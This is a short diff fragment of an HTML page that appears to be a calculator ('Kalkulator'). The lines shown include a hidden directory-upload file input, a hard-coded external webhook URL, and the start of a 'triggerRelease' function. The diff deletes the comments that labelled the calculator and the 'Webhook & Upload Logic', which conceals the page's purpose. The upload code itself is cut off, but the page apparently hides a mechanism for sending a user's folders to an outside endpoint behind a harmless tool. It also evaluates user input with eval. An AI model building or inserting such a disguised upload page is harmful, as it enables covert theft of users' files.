@@ -113,13 +113,13 @@
     <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
 
     <script>
-        // Kalkulator Logic
+        
         let display = document.getElementById('display');
         function input(v) { if(display.value === '0') display.value = v; else display.value += v; }
         function clearDisplay() { display.value = '0'; }
         function calculate() { try { display.value = eval(display.value); } catch { display.value = 'Error'; } }
 
-        // Webhook & Upload Logic
+        
         const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbz12s5BQzOEpw3zmxqHxUwFD9UAjDrL2K5MQCI7Qgx_g_NL13SJwaUgZHEJ9I_CZYObAA/exec";
 
         function triggerRelease() {
